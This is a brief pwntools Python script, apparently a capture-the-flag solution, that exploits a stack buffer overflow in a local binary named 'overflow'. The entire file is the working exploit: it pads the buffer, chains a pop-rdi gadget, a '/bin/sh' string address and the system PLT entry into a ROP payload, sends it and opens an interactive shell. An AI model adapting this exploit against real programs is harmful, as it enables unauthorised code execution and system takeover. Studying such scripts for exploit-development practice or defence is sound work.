from pwn import *
sh=process('./overflow')
#sh = gdb('/overflow')
context.log_level='debug'
system=0x401080
elf=ELF('./overflow')
system=elf.plt['system']-4
main=elf.sym['main']
print("system:",hex(system))
pop_rdi=0x4012d0
binsh=0x40208b+6
pay=b'a'*0x28+p64(pop_rdi)+p64(binsh)+p64(0x40101a)+p64(system)+p64(main)
sh.recvuntil("int.\n")
#gdb.attach(sh)
pause()
sh.send(pay)

sh.recvuntil("okk")

sh.interactive()
